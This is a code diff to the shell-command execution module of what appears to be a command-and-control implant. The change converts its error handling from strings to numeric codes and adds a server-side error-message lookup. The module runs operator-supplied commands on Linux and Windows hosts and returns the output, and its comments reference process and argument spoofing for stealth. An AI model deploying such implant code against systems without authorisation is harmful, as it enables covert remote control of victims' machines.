@@ -97,15 +97,21 @@ int Run::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 int Run::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
     string shellCmd = c2Message.cmd();
-    std::string outCmd = execBash(shellCmd);
+    std::string outCmd;
+    int error = execBash(shellCmd, outCmd);
 
-    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_cmd(shellCmd);
+    if(error!=0)
+        c2RetMessage.set_errorCode(error);
     c2RetMessage.set_returnvalue(outCmd);
 
     return 0;
 }
 
+
+#define ERROR_PROCESS_START_FAIL 1 
+#define ERROR_WINDOWS 2
 
 // OPSEC parent process spoofing
 // OPSEC Command line argument spoofing
@@ -129,9 +135,8 @@ int Run::process(C2Message &c2Message, C2Message &c2RetMessage)
  *
  * @throws std::runtime_error If `popen()` fails on Linux.
  */
-std::string Run::execBash(const std::string& cmd)
+int Run::execBash(const std::string& cmd, std::string& result)
 {
-    std::string result;
 
 #ifdef __linux__ 
 
@@ -139,7 +144,7 @@ std::string Run::execBash(const std::string& cmd)
     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
     if (!pipe)
     {
-        throw std::runtime_error("popen() filed!");
+        return ERROR_PROCESS_START_FAIL;
     }
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
     {
@@ -160,19 +165,19 @@ std::string Run::execBash(const std::string& cmd)
     sa.lpSecurityDescriptor = NULL; 
     // Create a pipe for the child process's STDERR. 
     if ( ! CreatePipe(&g_hChildStd_ERR_Rd, &g_hChildStd_ERR_Wr, &sa, 0) ) {
-        return "Error";
+        return ERROR_WINDOWS;
     }
     // Ensure the read handle to the pipe for STDERR is not inherited.
     if ( ! SetHandleInformation(g_hChildStd_ERR_Rd, HANDLE_FLAG_INHERIT, 0) ){
-        return "Error";
+        return ERROR_WINDOWS;
     }
     // Create a pipe for the child process's STDOUT. 
     if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &sa, 0) ) {
-        return "Error";
+        return ERROR_WINDOWS;
     }
     // Ensure the read handle to the pipe for STDOUT is not inherited
     if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) ){
-        return "Error";
+        return ERROR_WINDOWS;
     }
     // Create the child process. 
     PROCESS_INFORMATION piProcInfo; 
@@ -208,8 +213,7 @@ std::string Run::execBash(const std::string& cmd)
     // If an error occurs, exit the application. 
     if ( ! bSuccess ) 
     {
-        result += "Error: Process failed to start.\n";
-        return result;
+        return ERROR_PROCESS_START_FAIL;
     }
 
     m_isProcessRuning=true;
@@ -258,7 +262,7 @@ std::string Run::execBash(const std::string& cmd)
 
     #endif
 
-    return result;
+    return 0;
 } 
 
 #ifdef _WIN32
@@ -285,3 +289,25 @@ int Run::killProcess()
 }
 
 #endif
+
+
+int Run::errorCodeToMsg(const C2Message& c2RetMessage, std::string& errorMsg)
+{
+#if defined(BUILD_TEAMSERVER) || defined(C2CORE_BUILD_TESTS)
+    int errorCode = c2RetMessage.errorCode();
+    if (errorCode > 0)
+    {
+        switch (errorCode)
+        {
+            case ERROR_PROCESS_START_FAIL:
+                errorMsg = "Process failed to start.";
+                break;
+
+            default:
+                errorMsg = "Unknown error: code " + std::to_string(errorCode);
+                break;
+        }
+    }
+#endif
+    return 0;
+}
